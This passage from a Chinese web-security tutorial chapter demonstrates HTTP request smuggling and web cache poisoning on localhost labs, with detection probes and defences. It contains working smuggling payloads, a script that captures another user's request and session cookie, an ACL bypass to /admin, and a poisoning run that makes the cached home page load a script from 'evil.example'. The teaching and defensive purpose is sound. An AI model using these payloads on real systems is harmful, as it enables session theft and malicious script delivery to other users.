[back] -- 后端解析出第 2 条请求（策略 te_first）（48 字节）--
[back]    b'GET /smuggled HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b''
[back]    b''
[back]    应答: HTTP/1.1 404 Not Found
```

前端取**最后一个** TE，值 `bogus` 非法，回退按 CL: 53 收下整段体并转发（168 字节全部穿过前端）；后端取**第一个** TE，按块语法在 5 字节处结束体，把 `GET /smuggled` 切成了下一条请求。==两个头都写的是 Transfer-Encoding，分歧不在"认不认"，而在"认哪一个"==。

### 3.5 小结与混淆变体

三种走私一张表收拢，==记法都是"前端策略.后端策略"==：

| 组合 | 前端怎么读 | 后端怎么读 | 走私载荷藏在哪 | CL 写多少 |
| ---- | ---- | ---- | ---- | ---- |
| CL.TE | CL，无视 TE | 块语法 | 块终止符 `0\r\n\r\n` 之后 | 覆盖"终止符 + 走私请求"全长 |
| TE.CL | 块语法 | CL | 一个块的数据区 | 只算块大小行 |
| TE.TE | 重复 TE 取最后一个 | 重复 TE 取第一个 | 与 CL.TE 相同 | 覆盖"终止符 + 走私请求"全长 |

> [!info]- TE 混淆的常见变体
> TE.TE 的本质是"两侧对同一个 TE 头的解释不同"，重复头只是最朴素的一种。常见变体（构造思路与 3.4 相同）：
>
> - 头名混淆：`Transfer-Encoding : chunked`（冒号前加空格）、制表符分隔、大小写混合——一侧剥空白后认成 TE，另一侧当未知头；
> - 值混淆：`xchunked`、`chunked;`、`identity, chunked`、`chunked\r\n` 折行——一侧宽容解析，一侧拒绝；
> - TE 与 CL 并存再叠加重复：让"取第一个还是最后一个"与"信 TE 还是信 CL"两个分歧互相组合。
>
> 每种变体都要两侧各错半步才成立，靶上调试时先看两侧日志里各自把体判成多大，再回头改构造。

> [!info]- 改写型前端对构造的影响
> 真实前端常见两种改写。一是 **de-chunk**：前端把块状体解成原始数据，补一个新 Content-Length 再转发——此时 TE.CL 的载荷会随新 CL 一起被后端吃进体，3.3 节的构造失效，但 CL.TE 依旧成立（前端信 CL 时通常不做 de-chunk）。二是**头部重排/删除**：前端删掉不认识的 TE 变体——1.2 节表里的"混淆头名"类变体随之失效。==构造走私前先判断前端是"透传型"还是"改写型"，判断方法就是第 5 节的检测==。

## 4. 走私的利用

### 4.1 打穿前端拦截：够不到的 /admin

后端的 `/admin` 只有前端 ACL 拦着。直连确认拦住了：

```bash
curl -si --noproxy '*' http://127.0.0.1:9600/admin
```

输出：

```
HTTP/1.1 403 Forbidden
Content-Type: text/plain; charset=utf-8
Content-Length: 19
Server: lab/0.1

FORBIDDEN BY FRONT
```

把走私载荷换成 `GET /admin`（`cl_te(A)`，A 是完整的 admin 请求），后面补发一条正常请求接住响应：

```bash
python3 smuggle_lab.py back 9601 te_first > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 cl > front.log 2>&1 &
sleep 1
python3 send.py 127.0.0.1 9600 clteadmin.raw getroot.raw
```

输出：

```
== 发出请求 #1（clteadmin.raw，139 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 50'
    b'Transfer-Encoding: chunked'
    b''
    b'0'
    b''
    b'GET /admin HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 发出请求 #2（getroot.raw，40 字节）==
    b'GET / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 收到的响应 ==
-- 响应 #1 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE

-- 响应 #2 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 42
Server: lab/0.1

ADMIN PANEL flag{fr0nt_1s_n0t_4_b0und4ry}
```

flag 到手。前端日志里只有 `POST /`（体字节不触发 ACL），后端日志里第 2 条请求是 `GET /admin`、应答 200——==ACL 写在前端，检查的却是"请求行的路径"，而走私载荷根本不出现在请求行里==。这也是一条通用结论：前端能拦的只有它看得见的东西。

### 4.2 捕获下一个用户的请求：恶意前缀

更强的用法：走私过去的不放一条完整请求，而放**半条**——一条故意不写完的 `POST /reflect`。后端读完头部后按 `Content-Length` 等体，==等来的却是这条连接上的下一段字节：下一个用户的真实请求==。后端把"等来的字节"全当成体，`/reflect` 的响应里就回显着受害者的请求头，Cookie 在内。

攻击脚本（`capture_atk.py`）分四步，三个 `sleep` 是时序控制，保证字节按"前缀 → 攻击者补齐 → 受害者"的顺序落进后端的缓冲：

```python
# capture_atk.py —— 走私"没写完的请求"当前缀，把下一个用户的请求变成它的请求体
# 场景：CL.TE（前端 9600 信 CL，后端 9601 信 TE）
# 时序：走私前缀 → (睡 0.5s) → 攻击者补齐字节 → (睡 0.5s) → 受害者请求（被吃进体里）
import socket
import sys
import threading
import time

from smuggle_kit import cl_te, plain

VICTIM_REQ = (b'GET / HTTP/1.1\r\n'
              b'Host: 127.0.0.1:9600\r\n'
              b'Cookie: session=v1ct1m_s3cr3t_t0k3n\r\n'
              b'Connection: keep-alive\r\n'
              b'\r\n')

ATTACKER_NEXT = plain('/poll')


def victim_job(timeout):
    time.sleep(1.0)                       # 时序控制 2：等攻击者的补齐字节先落地
    try:
        v = socket.create_connection(('127.0.0.1', 9600))
        v.settimeout(timeout)
        v.sendall(VICTIM_REQ)
        data = v.recv(4096)
        print(f'== 受害者 ==', flush=True)
        print(data.decode(errors='replace'), flush=True)
    except socket.timeout:
        print(f'== 受害者 == 等待 {timeout}s：一个响应都没等到', flush=True)


def main():
    timeout = float(sys.argv[1]) if len(sys.argv) > 1 else 3
    # 前缀是一条故意不写完的 POST：CL 只差"补齐字节 + 受害者请求"那么长
    reflect_cl = len(ATTACKER_NEXT) + len(VICTIM_REQ)
    prefix = (b'POST /reflect HTTP/1.1\r\n'
              b'Host: 127.0.0.1:9600\r\n'
              b'Content-Length: %d\r\n\r\n' % reflect_cl)
    req = cl_te(prefix)

    threading.Thread(target=victim_job, args=(timeout,), daemon=True).start()

    s = socket.create_connection(('127.0.0.1', 9600))
    s.settimeout(timeout)
    print(f'== 攻击者：发出走私请求（{len(req)} 字节）==', flush=True)
    for line in req.split(b'\r\n'):
        print('   ', repr(line), flush=True)
    s.sendall(req)
    time.sleep(0.5)                       # 时序控制 1：等前缀在后端扎住
    print('== 攻击者：补齐 /reflect 的体（自己的第二条请求）==', flush=True)
    for line in ATTACKER_NEXT.split(b'\r\n'):
        print('   ', repr(line), flush=True)
    s.sendall(ATTACKER_NEXT)

    time.sleep(1.5)                       # 时序控制 3：等受害者字节被吃、响应回来
    buf = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    n, pos = 0, 0
    while True:
        j = buf.find(b'\r\n\r\n', pos)
        if j < 0:
            break
        end = j + 4 + int(buf[pos:j].split(b'Content-Length: ')[1].split(b'\r\n')[0])
        n += 1
        print(f'-- 攻击者的响应 #{n} --', flush=True)
        print(buf[pos:end].decode(errors='replace'), flush=True)
        pos = end


if __name__ == '__main__':
    main()
```

`Content-Length: 145` 是程序算出来的：补齐请求 44 字节 + 受害者请求 101 字节——==前缀把体的尺寸声明成"刚好吞下这两段"==。跑：

```bash
python3 smuggle_lab.py back 9601 te_first > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 cl > front.log 2>&1 &
sleep 1
python3 capture_atk.py 3
```

输出：

```
== 攻击者：发出走私请求（163 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 74'
    b'Transfer-Encoding: chunked'
    b''
    b'0'
    b''
    b'POST /reflect HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 145'
    b''
    b''
== 攻击者：补齐 /reflect 的体（自己的第二条请求）==
    b'GET /poll HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 受害者 == 等待 3.0s：一个响应都没等到
-- 攻击者的响应 #1 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE

-- 攻击者的响应 #2 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 160
Server: lab/0.1

your body was:
GET /poll HTTP/1.1
Host: 127.0.0.1:9600

GET / HTTP/1.1
Host: 127.0.0.1:9600
Cookie: session=v1ct1m_s3cr3t_t0k3n
Connection: keep-alive
```

攻击者的响应 #2 里躺着受害者的完整请求，`Cookie: session=v1ct1m_s3cr3t_t0k3n` 在列。后端日志从字节层面复核这件事：

```bash
tail -20 back.log
```

输出：

```
[back] -- 后端解析出第 2 条请求（策略 te_first）（214 字节）--
[back]    b'POST /reflect HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b'Content-Length: 145'
[back]    b''
[back]    b'GET /poll HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b''
[back]    b'GET / HTTP/1.1'
[back]    b'Host: 127.0.0.1:9600'
[back]    b'Cookie: session=v1ct1m_s3cr3t_t0k3n'
[back]    b'Connection: keep-alive'
[back]    b''
[back]    b''
[back]    应答: HTTP/1.1 200 OK
```

在==后端的账本==上，`/reflect` 这条请求的体就是两段真实请求的字节。三个结果各归各位：受害者一个响应都没等到（它的请求字节被吃了）；攻击者拿到回显；前端的账上这场交换只出现过三条正常请求。真实环境里受害者的 Cookie 就是会话凭证，拿去冒充对方即可——[[W13-逻辑与认证漏洞|W13]] 的会话劫持在这里换了个入口。

> [!note] 时序与 CL 的尺寸是这类利用的两个工程难点
> 靶里三个 `sleep` 把字节到达顺序钉死；真实环境没有这层控制，受害者的请求何时落进缓冲全看流量，攻击者通常反复发送前缀、循环发探测请求"收网"。`Content-Length: 145` 之类尺寸在真实环境只能估算（受害者请求长度未知），写大了连接卡死、写小了请求被截断——所以实战里的前缀捕获常配合"不完整请求 + 等待"的形态，让任何长度的后续字节都能被吃。

> [!info]- 走私的更远落点
> 内网里"只有后端能访问"的接口，走私都能精确送达：不看前端 ACL 的管理接口（4.1）、回显内部信息的调试接口、以及把请求体直接交给危险函数的接口。最后这类是质变：后端某个内部服务若把体交给 `pickle.loads` 一类反序列化入口，解析层的分歧就升级成了代码执行——Python 反序列化的完整打法在 [[W15-Python反序列化与沙箱逃逸|W15]] 展开。走私把"够不到"变成"精确可达"，落地之后打什么，用其他章节的武器库。

## 5. 检测：把走私问出来

走私的全部 observable 都来自"前端记账"与"后端解析"的计数差：前端认为发了 1 条请求，后端解析出 2 条。三种检测把这个计数差转换成三种可观察信号：**响应内容差**、**时间差**、**报错差**。以下都在自建靶上进行。

### 5.1 计数差异法

思路：让后端把"体之后"的错位字节解析成一条**指向专属探测路径**的请求（`/probe`，响应体是可区分的 `PROBE`），再补发一条正常请求。第二条响应若不是 `/` 的内容而是 `PROBE`，计数差坐实。先跑对照——同样的 CL 少报，但没有 TE 头，两侧无分歧：

```bash
python3 send.py 127.0.0.1 9600 clonly.raw getroot.raw
```

输出：

```
== 发出请求 #1（clonly.raw，65 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 5'
    b''
    b'0'
    b''
    b''
== 发出请求 #2（getroot.raw，40 字节）==
    b'GET / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 收到的响应 ==
-- 响应 #1 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE

-- 响应 #2 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE
```

阴性：两条响应都是 `HOME PAGE`。加上 TE 头（`clteprobe.raw`，载荷 `GET /probe`），再打一轮——客户端是新连接，前端到后端的那条长连接却还是同一条，错位就长在它上面：

```bash
python3 send.py 127.0.0.1 9600 clteprobe.raw getroot.raw
```

输出：

```
== 发出请求 #1（clteprobe.raw，139 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 50'
    b'Transfer-Encoding: chunked'
    b''
    b'0'
    b''
    b'GET /probe HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 发出请求 #2（getroot.raw，40 字节）==
    b'GET / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b''
    b''
== 收到的响应 ==
-- 响应 #1 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE

-- 响应 #2 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 6
Server: lab/0.1

PROBE
```

阳性：第二条响应变成了 `PROBE`。=="CL 与体长的差值"制造错位，"可区分的探测路径"把错位显影==——这一对构造就是计数差异法的全部。

### 5.2 计时法

思路：让后端**等一个不会来的体**。发一条 `Content-Length: 20`、体只有块状 12 字节的请求给"前端信 TE、后端信 CL"的组合：前端按块读完照常转发，后端按 CL 等剩下 8 个字节——连接被占住，后续请求得不到响应。对照组是两条普通请求（`time_probe.py`）：

```python
# time_probe.py —— 计时法探测：让后端去等不存在的体字节，看连接被占住多久
# 场景：TE.CL（前端 9600 信 TE，后端 9601 信 CL）
import socket
import time

HOST, PORT = '127.0.0.1', 9600


def timed_exchange(requests, label, timeout=3.0):
    s = socket.create_connection((HOST, PORT))
    s.settimeout(timeout)
    print(f'== {label} ==', flush=True)
    for k, req in enumerate(requests, 1):
        t0 = time.perf_counter()
        s.sendall(req)
        try:
            s.recv(4096)
            dt = time.perf_counter() - t0
            print(f'   请求 #{k} 收到响应，耗时 {dt:.3f}s', flush=True)
        except socket.timeout:
            dt = time.perf_counter() - t0
            print(f'   请求 #{k} 等了 {dt:.3f}s：没有任何响应', flush=True)
            break
    s.close()


HOME = b'GET / HTTP/1.1\r\nHost: 127.0.0.1:9600\r\n\r\n'

# 对照组：两条普通请求
timed_exchange([HOME, HOME], '对照组：两条正常请求')

# 探测组：第一条 CL 写 20、实际块状体只有 12 字节；
# 信 TE 的前端照常收下转发，信 CL 的后端在等剩下的 8 字节，把连接占住
probe = (b'POST / HTTP/1.1\r\n'
         b'Host: 127.0.0.1:9600\r\n'
         b'Content-Length: 20\r\n'
         b'Transfer-Encoding: chunked\r\n'
         b'\r\n'
         b'1\r\nA\r\n0\r\n\r\n')
timed_exchange([probe, HOME], '探测组：CL 故意比体长 8 字节')
```

```bash
python3 smuggle_lab.py back 9601 cl > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 te > front.log 2>&1 &
sleep 1
python3 time_probe.py
```

输出：

```
== 对照组：两条正常请求 ==
   请求 #1 收到响应，耗时 0.004s
   请求 #2 收到响应，耗时 0.003s
== 探测组：CL 故意比体长 8 字节 ==
   请求 #1 等了 3.003s：没有任何响应
```

毫秒级与超时的对比就是结论。计时法不需要区分响应内容，==适合对干扰敏感的目标做无痕探测==；代价是只回答"有没有错位"，不回答错位的方向。

### 5.3 双 TE 探测：给前端的解析策略留指纹

前两种检测回答"能不能走私"，这一种回答"前端是怎么解析的"。方法：发**重复的 TE 头**，两个值一真一假（`chunked` 与 `bogus`），配一个 CL 少报的体（`Content-Length: 5`，体是 17 字节的块状结构），然后==翻转两个 TE 的顺序==，看结果变不变。每个探针都重新起靶，避免上一次的错位污染下一条连接：

```bash
# 对照：单条 TE，CL 与体一致
python3 smuggle_lab.py back 9601 te_first > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 te > front.log 2>&1 &
sleep 1
python3 send.py 127.0.0.1 9600 te_one.raw --timeout 3
```

输出：

```
== 发出请求 #1（te_one.raw，104 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 17'
    b'Transfer-Encoding: chunked'
    b''
    b'5'
    b'AAAAA'
    b'0'
    b''
    b''
== 收到的响应 ==
-- 响应 #1 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE
```

```bash
# 探针一：TE 顺序 [chunked, bogus]
pkill -f smuggle_lab.py
python3 smuggle_lab.py back 9601 te_first > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 te > front.log 2>&1 &
sleep 1
python3 send.py 127.0.0.1 9600 te_dup1.raw --timeout 3
```

输出：

```
== 发出请求 #1（te_dup1.raw，129 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 5'
    b'Transfer-Encoding: chunked'
    b'Transfer-Encoding: bogus'
    b''
    b'5'
    b'AAAAA'
    b'0'
    b''
    b''
== 收到的响应 ==
(一个响应都没等到)
```

```bash
# 探针二：同一请求，翻转 TE 顺序为 [bogus, chunked]
pkill -f smuggle_lab.py
python3 smuggle_lab.py back 9601 te_first > back.log 2>&1 &
python3 smuggle_lab.py front 9600 9601 te > front.log 2>&1 &
sleep 1
python3 send.py 127.0.0.1 9600 te_dup2.raw --timeout 3
```

输出：

```
== 发出请求 #1（te_dup2.raw，129 字节）==
    b'POST / HTTP/1.1'
    b'Host: 127.0.0.1:9600'
    b'Content-Length: 5'
    b'Transfer-Encoding: bogus'
    b'Transfer-Encoding: chunked'
    b''
    b'5'
    b'AAAAA'
    b'0'
    b''
    b''
== 收到的响应 ==
-- 响应 #1 --
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Content-Length: 10
Server: lab/0.1

HOME PAGE
```

三组结果对照读：

| 探针 | 响应 | 指纹结论 |
| ---- | ---- | ---- |
| 单 TE，CL 与体一致 | 200 正常 | 基线：靶工作正常 |
| 重复 TE `[chunked, bogus]` | 无响应（卡死） | 前端取**最后一个** TE，`bogus` 非法 → 回退按 CL 收了 5 字节；后端按 `chunked` 等剩下的块数据 → 连接悬住 |
| 重复 TE `[bogus, chunked]` | 200 正常 | 顺序翻转结果翻转，坐实"取最后一个"；且重复 TE 没有被拒绝 |

有些实现会选择直接报 400（"报错探测"的来源）——探针打出去若收到 400，同样是有效指纹：==该前端拒绝二义头，走私路走不通，但解析策略已经探明==。换一种前端策略（比如取第一个 TE），探针一和探针二的结果会对调，这正是"指纹"的含义：结果差异刻画的是解析器，不是网络。

## 6. Web 缓存投毒

### 6.1 缓存键与 unkeyed 输入

部署在源站前面的缓存（CDN、反向代理的缓存层）用**缓存键**（cache key）决定"这个请求该命中哪份存档"：典型的键是方法 + 主机 + 路径（含查询串）。==请求里其余的部分——大部分头部——不参与键的计算，却会被转发给源站==，这类输入叫 **unkeyed 输入**。

漏洞的形状就一句话：==某个 unkeyed 输入参与了响应内容的生成==。[[W01-Web安全导论与HTTP深化#2. 安全相关请求头深化|W01 2 节]]列过一批这类头（`X-Forwarded-Host`、`X-Forwarded-For`、`X-Original-URL` 等）。攻击者带一个恶意值请求 `/`，源站把它织进响应体，缓存把这个"被织过"的响应存到键 `/` 下面——==随后所有请求 `/` 的普通用户都命中这份毒档==，而他们自己什么都没发过。这本质上是一次强制的存储型 XSS 投放（载荷形态见 [[W08-XSS|W08]]）。

### 6.2 极简缓存靶

自建一台最小的缓存（`cache_lab.py`）：缓存 9602，源站 9603。缓存键只有路径（含查询串），TTL 10 秒；源站生成首页时，脚本地址取自 `X-Forwarded-Host` 头——==没有这个头才退回 Host==，一个"不参与键、却参与生成"的 unkeyed 输入：

```python
#!/usr/bin/env python3
# cache_lab.py —— 极简 Web 缓存靶：9602 是缓存，9603 是源站
# 用法：python3 cache_lab.py origin 9603
#       python3 cache_lab.py cache  9602 9603
#
# 缓存规则（故意做成最小的）：
#   键 = 请求行里的"路径?查询串"，其余一律不参与；
#   命中且未过 TTL（10 秒）→ 直接回存下来的响应，不回源；
#   未命中或过期 → 把收到的请求原样转发给源站，响应存入缓存。
import socket
import sys
import threading
import time

TTL = 10
store = {}          # 键 -> (存入时刻, 响应字节)
store_lock = threading.Lock()
print_lock = threading.Lock()


def log(tag, text=''):
    with print_lock:
        print(f'[{tag}] {text}', flush=True)


def parse_head(data):
    head = data.split(b'\r\n\r\n')[0]
    lines = head.split(b'\r\n')
    headers = {}
    for line in lines[1:]:
        if b':' in line:
            k, v = line.split(b':', 1)
            headers[k.strip().lower().decode()] = v.strip().decode()
    return lines[0], headers


# ---------------- 源站 ----------------

def origin_response(raw):
    start, headers = parse_head(raw)
    # 页面里的脚本地址取自 X-Forwarded-Host，没有这个头才用 Host——
    # 一个"不参与缓存键、却参与响应生成"的头
    host = headers.get('x-forwarded-host') or headers.get('host') or '127.0.0.1'
    body = ('<!doctype html>\n<html><body>\n'
            '<h1>HOME PAGE</h1>\n'
            f'<script src="http://{host}/analytics.js"></script>\n'
            '</body></html>\n').encode()
    return (b'HTTP/1.1 200 OK\r\n'
            b'Content-Type: text/html\r\n'
            b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
            b'Server: lab-origin/0.1\r\n\r\n' + body)


def origin_client(conn):
    data = b''
    while b'\r\n\r\n' not in data:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
    if data:
        start, headers = parse_head(data)
        extra = headers.get('x-forwarded-host')
        log('origin', f'收到 {start.decode()}'
            + (f'（X-Forwarded-Host: {extra}）' if extra else ''))
        conn.sendall(origin_response(data))
    conn.close()


def origin_serve(port):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('127.0.0.1', port))
    srv.listen(8)
    log('origin', f'源站就绪 127.0.0.1:{port}')
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=origin_client, args=(conn,), daemon=True).start()


# ---------------- 缓存 ----------------

def forward_to_origin(raw, origin_port):
    s = socket.create_connection(('127.0.0.1', origin_port), timeout=3)
    s.sendall(raw)
    resp = b''
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    s.close()
    return resp


def cache_client(conn, origin_port):
    data = b''
    while b'\r\n\r\n' not in data:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
    if not data:
        conn.close()
        return
    start, _ = parse_head(data)
    key = start.split(b' ')[1].decode()      # 缓存键：只有路径（含查询串）
    now = time.time()
    with store_lock:
        if key in store and now - store[key][0] < TTL:
            log('cache', f'HIT   key={key}（{now - store[key][0]:.1f}s 前存入，直接回存档）')
            resp = store[key][1]
        else:
            why = '已过期' if key in store else '没有存档'
            log('cache', f'MISS  key={key}（{why}，回源）')
            resp = forward_to_origin(data, origin_port)
            store[key] = (time.time(), resp)
            log('cache', f'STORE key={key}（TTL {TTL}s）')
    conn.sendall(resp)
    conn.close()


def cache_serve(port, origin_port):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('127.0.0.1', port))
    srv.listen(8)
    log('cache', f'缓存就绪 127.0.0.1:{port} → 源站 127.0.0.1:{origin_port}，键=路径，TTL={TTL}s')
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=cache_client, args=(conn, origin_port), daemon=True).start()


if __name__ == '__main__':
    role = sys.argv[1]
    if role == 'origin':
        origin_serve(int(sys.argv[2]))
    elif role == 'cache':
        cache_serve(int(sys.argv[2]), int(sys.argv[3]))
```

> [!warning] 缓存投毒影响的是"该键下的所有后续用户"
> 与前半章的走私不同，走私的受害者通常是个体（下一个连上来的用户），投毒的受害者是**所有人**。本章的靶只绑 `127.0.0.1`，任何针对缓存与走私的实验都只应打自建或授权靶场。

### 6.3 投毒全过程

起靶，第一步带恶意头请求 `/`：

```bash
python3 cache_lab.py origin 9603 > origin.log 2>&1 &
python3 cache_lab.py cache 9602 9603 > cache.log 2>&1 &
sleep 1
curl -si --noproxy '*' -H 'X-Forwarded-Host: evil.example' http://127.0.0.1:9602/
```

输出：

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 120
Server: lab-origin/0.1

<!doctype html>
<html><body>
<h1>HOME PAGE</h1>
<script src="http://evil.example/analytics.js"></script>
</body></html>
```

这一轮在缓存日志里是 MISS + STORE：源站把 `evil.example` 织进脚本地址，响应以键 `/` 存档。第二步，普通用户（不带任何头）请求 `/`：

```bash
curl -si --noproxy '*' http://127.0.0.1:9602/
```

输出：

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 120
Server: lab-origin/0.1

<!doctype html>
<html><body>
<h1>HOME PAGE</h1>
<script src="http://evil.example/analytics.js"></script>
</body></html>
```

受害者拿到的是同一份带 `evil.example` 的页面——==这个用户连 `X-Forwarded-Host` 头都没发过==。缓存日志的对应行是 `HIT key=/`，直接回的存档。第三步验证键的边界——查询串属于键，换个查询串就是另一个键：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9602/?utm=1'
```

输出：

```
<!doctype html>
<html><body>
<h1>HOME PAGE</h1>
<script src="http://127.0.0.1:9602/analytics.js"></script>
</body></html>
```

`/?utm=1` 未被投毒（干净的 `Host` 版本）——==头部不影响键，查询串影响键==，这就是 unkeyed 与 keyed 的分界线。最后等 TTL 过期，毒档被淘汰，`/` 恢复干净：

```bash
sleep 11
curl -s --noproxy '*' http://127.0.0.1:9602/
```

输出：

```
<!doctype html>
<html><body>
<h1>HOME PAGE</h1>
<script src="http://127.0.0.1:9602/analytics.js"></script>
</body></html>
```

两侧日志收尾对账：

```bash
cat cache.log origin.log
```

输出：

```
[cache] 缓存就绪 127.0.0.1:9602 → 源站 127.0.0.1:9603，键=路径，TTL=10s
[cache] MISS  key=/（没有存档，回源）
[cache] STORE key=/（TTL 10s）
[cache] HIT   key=/（0.0s 前存入，直接回存档）
[cache] MISS  key=/?utm=1（没有存档，回源）
[cache] STORE key=/?utm=1（TTL 10s）
[cache] MISS  key=/（已过期，回源）
[cache] STORE key=/（TTL 10s）
[origin] 源站就绪 127.0.0.1:9603
[origin] 收到 GET / HTTP/1.1（X-Forwarded-Host: evil.example）
[origin] 收到 GET /?utm=1 HTTP/1.1
[origin] 收到 GET / HTTP/1.1
```

源站日志里只有 3 次回源：==受害者的那次 HIT 根本没到过源站==——它消费的是缓存里的字节，这正是投毒的危害放大器：一个请求的恶意值，服务的是之后所有命中同键的请求。

> [!info]- 怎么找 unkeyed 输入
> 判断"哪个头不参与键"的土办法：对同一路径发两次请求，第二次带一个值特殊的候选头（如 `X-Forwarded-Host: xxx`），看响应是否变化、`Age`/`X-Cache` 一类缓存头是否显示命中。Burp 的 Param Miner 扩展（[[W02-工具链实战与靶场搭建|W02]] 的 Burp 环境可装）把这套对照自动化，批量枚举 unkeyed 头。找到候选后，再看响应体/跳转地址里有没有它的影子——==进了键的输入投不了毒，进了响应的输入才值得追==。

### 6.4 与走私的组合（原理）

前半章与后半章在真实架构里是接力关系。缓存位于最外层，它按自己的键规则决定回源与存档；走私发生在"前端与后端"之间。两者组合的经典形态有二：

1. **跨层错配**：走私让后端多生成一个响应，这个响应携带攻击者控制的路径与内容。前端的缓存按它自己的记账把"某个键"与"某份响应"配对——配错时，==键是正常页面，内容是攻击者的==，投毒在缓存层完成落地。前半章 3.3 节末尾"滞留在队列里的多余响应"就是这一形态的原材料。
2. **绕过缓存层的过滤**：部分缓存会对请求做改写或对特定头做剥离后才回源；把带 unkeyed 头的投毒请求走私成"体字节"送过后端，==缓存层对体的字节不做头部级处理==，源站照样读到恶意头。

两式的共同根因与走私一致：==每一层都按自己的模型解释字节流，模型之间的缝隙就是攻击面==。组合形态依赖具体产品的配对与改写细节，无法用本章的极简靶一一代替，理解原理后在授权环境里按第 5 节的探针思路逐层确认。

## 7. 防御

按修复优先级排列，前两条是根：

| 措施 | 要点 |
| ---- | ---- |
| 端到端统一解析 | 链路上所有组件（CDN、负载均衡、WAF、应用）用同一套符合规范的 HTTP 解析实现；理想状态是同一份库 |
| 禁止二义输入 | TE 与 CL 并存、重复 CL、重复 TE、混淆头名（冒号前空白、非法值）一律 400——==把"应当拒绝"落实成"必须拒绝"== |
| 中间层不改写请求 | 不做 de-chunk、不改写 CL；确需改写时保证定界语义等价，并让下游知道 |
| 缩短长连接信任 | 前后端之间按请求隔离或降低连接复用，代价是性能；HTTP/2 端到端时帧边界天然消除了二义性，这是业界收敛的方向，但内部仍转 HTTP/1.1 的链路要守住前三条 |
| 上线走私探针 | 第 5 节的三种检测做成监控项，错位发生时计数差会先于用户报障出现 |
| 缓存键完整化 | 影响响应的输入全部纳入键，或对 unkeyed 输入做白名单/编码校验后才允许进响应；敏感路径不缓存 |

> [!note] 一条自查顺序
> 排查自己的应用时从下往上：先确认应用框架的解析器行为（信 TE 还是 CL、重复头怎么取），再确认它前面的每一层，最后才看缓存。==修复从"统一解析 + 拒绝二义"开始，其他措施都是补充==。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| nc 发 CL.TE 请求，后端没解析出走私请求 | 三处细节逐一查：行尾必须是 `\r\n` 不能是 `\n`；头之后的空行必须真空一行；CL 要把 `\r\n` 的字节全数进去。用 `printf '...\r\n...' \| nc …` 或干脆用 `len()` 算好写文件再 `nc … < 文件`（[[10-网络协议基础#5.4 nc 手发原始 HTTP\|10 章 5.4]]） |
| 手算的 CL 总差 2 或差 4 | 结尾空行是 `\r\n\r\n` 四个字节，常见漏法是只算一个换行或漏掉终止块的收尾空行；全部交给 `len(body)` 计算（[[#3.1 构造与发送的工具\|3.1]]） |
| 走私成功一次后，靶上后续请求全部错乱 | 错位挂在连接上不会自愈：后端的多余解析状态、前端队列里滞留的响应都会继续错配。换新连接只能缓解后端一侧，重起靶最干净 |
| python 脚本收请求只收到半条 | TCP 粘包/拆包：`recv` 一次到的字节数不定，必须循环到边界条件（`\r\n\r\n`、CL 数量、块终止）满足（[[#2.1 设计与靶代码\|2.1]] 的 `ByteStream`） |
| 计时法两边都超时，分不清是不是走私 | 先跑对照组排除网络与靶本身慢；探测的 CL 差值给小（几个字节），并把对照组与探测组打在同一靶上对比（[[#5.2 计时法\|5.2]]） |
